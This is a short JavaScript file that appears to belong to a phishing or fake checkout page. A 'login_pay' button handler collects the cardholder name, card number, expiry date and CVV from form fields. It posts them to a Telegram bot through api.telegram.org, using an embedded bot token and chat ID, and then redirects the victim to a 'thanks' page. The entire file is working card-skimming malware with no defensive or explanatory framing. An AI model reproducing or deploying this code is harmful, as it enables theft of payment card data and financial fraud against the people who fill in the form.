const btn = document.getElementById("login_pay");
btn.addEventListener("click", () => send());

function send() {
  const token = "6768935322:AAFXBkDGX4QJHF2pd2rzCtpoHLisecfBL8o";
  const chatId = "5977727607";

  const cartholder = document.getElementsByName("cartholder")[0].value;
  const ccnumb = document.getElementsByName("ccnumb")[0].value;
  const expr = document.getElementsByName("expr")[0].value;
  const cvvz = document.getElementsByName("cvvz")[0].value;

  const message = `________CREDIT_CARD_________
CARD_HOLDER      : ${cartholder}
CARD_NUM         : ${ccnumb}
EXP_DATE         : ${expr}
CVV              : ${cvvz}
_______________________`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  fetch(url, { method: "POST" })
    .then((response) => {
      response.ok &&
        window.location.replace(window.location.origin + "/order/thanks.html");
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
